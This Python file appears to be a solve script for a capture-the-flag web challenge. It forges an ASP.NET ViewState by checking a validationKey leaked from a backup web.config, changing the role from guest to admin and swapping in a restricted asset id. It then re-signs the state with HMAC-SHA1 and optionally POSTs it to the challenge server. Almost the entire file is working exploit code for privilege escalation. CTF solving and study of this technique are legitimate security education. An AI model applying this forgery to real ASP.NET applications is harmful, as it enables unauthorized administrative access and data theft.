#!/usr/bin/env python3
"""Solve script for THJCC CTF 2026 — Web — Contoso Asset Portal.

The portal stores an ASP.NET ViewState protected only by
``HMAC-SHA1(validationKey, serialized_payload)`` — no encryption.  A backup
listing (/backup/) leaked ``web.config~`` which contains the current
``validationKey``.  Because the serialized state is plaintext and we own the
signing key, we can flip ``role=guest`` -> ``role=admin`` (and swap the asset
id to a restricted one), recompute the MAC, and submit a forged ViewState.

Usage:
    python3 solve.py                      # forge + print only (offline)
    python3 solve.py --submit             # forge + POST to the live target
    python3 solve.py --submit --host http://chal.thjcc.org:31255
"""

from __future__ import annotations

import argparse
import base64
import hashlib
import hmac
import sys

from loguru import logger

# --- Known / leaked values (confirmed during recon) --------------------------

# ViewState served by GET /Default.aspx for an anonymous (guest) session.
BASE_VIEWSTATE: str = "/wEMAQVndWVzdAELQVNULTAwMDAwMDBQfx4K0++04ChDSFo9xbXAJ2UUJg=="

# validationKey leaked via /backup/web.config~ (hex, SHA1 validation).
VALIDATION_KEY_HEX: str = (
    "F3690E7A9D8F4C2B1A5E6D7C8B9A0F1E2D3C4B5A69788796"
    "A5B4C3D2E1F0A9B8C7D6E5F4A3B2C1D0E9F8A7B6C5D4E3F2"
    "A1B0C9D8E7F6A5B4C3D2E1F0A9B8"
)

# Serialized ViewState holds two plaintext strings; we rewrite them in place.
# Both replacements are length-preserving, so no length prefixes change.
ROLE_FROM: bytes = b"guest"
ROLE_TO: bytes = b"admin"
ASSET_FROM: bytes = b"AST-0000000"
ASSET_TO: bytes = b"AST-4F2A9C0"  # restricted asset seen in assets.csv.bak

MAC_LEN: int = 20  # HMAC-SHA1 digest length in bytes


def split_viewstate(viewstate_b64: str) -> tuple[bytes, bytes]:
    """Return (payload, signature) from a base64 ViewState string."""
    raw: bytes = base64.b64decode(viewstate_b64)
    return raw[:-MAC_LEN], raw[-MAC_LEN:]


def sign(key: bytes, payload: bytes) -> bytes:
    """Compute the ASP.NET ViewState MAC: HMAC-SHA1(validationKey, payload)."""
    return hmac.new(key, payload, hashlib.sha1).digest()


def forge(viewstate_b64: str, key: bytes) -> str:
    """Forge an admin ViewState and return it base64-encoded."""
    payload, original_sig = split_viewstate(viewstate_b64)

    # Sanity: the leaked key must reproduce the original signature, otherwise
    # every forged token would be rejected by EnableViewStateMac.
    if sign(key, payload) != original_sig:
        logger.error("leaked key does NOT match original signature — aborting")
        raise SystemExit(1)
    logger.success("leaked validationKey verified against original MAC")

    forged_payload: bytes = payload.replace(ROLE_FROM, ROLE_TO).replace(
        ASSET_FROM, ASSET_TO
    )
    if len(forged_payload) != len(payload):
        logger.error("length changed after substitution — would corrupt state")
        raise SystemExit(1)

    forged: str = base64.b64encode(forged_payload + sign(key, forged_payload)).decode()
    logger.info("forged payload: {}", forged_payload)
    logger.success("forged ViewState: {}", forged)
    return forged


def submit(host: str, viewstate: str) -> None:
    """POST the forged ViewState to the live target and print the response."""
    try:
        import requests
    except ImportError:
        logger.error("install requests:  pip install requests")
        raise SystemExit(1)

    url: str = host.rstrip("/") + "/Default.aspx"
    data: dict[str, str] = {
        "__VIEWSTATE": viewstate,
        "__VIEWSTATEGENERATOR": "",
        "ctl00$asset": ASSET_TO.decode(),
        "ctl00$lookup": "Lookup",
    }
    logger.info("POST {}", url)
    resp = requests.post(url, data=data, timeout=10)
    logger.info("HTTP {}", resp.status_code)
    print(resp.text)
    if "THJCC{" in resp.text:
        flag: str = resp.text[resp.text.index("THJCC{") :].split("}")[0] + "}"
        logger.success("FLAG: {}", flag)


def main() -> None:
    parser = argparse.ArgumentParser(description="Forge ASP.NET ViewState (Contoso)")
    parser.add_argument("--submit", action="store_true", help="POST to live target")
    parser.add_argument(
        "--host",
        default="http://chal.thjcc.org:31255",
        help="target base URL",
    )
    args = parser.parse_args()

    key: bytes = bytes.fromhex(VALIDATION_KEY_HEX)
    forged: str = forge(BASE_VIEWSTATE, key)

    if args.submit:
        submit(args.host, forged)
    else:
        logger.info("dry run — re-run with --submit to send it")


if __name__ == "__main__":
    sys.exit(main())
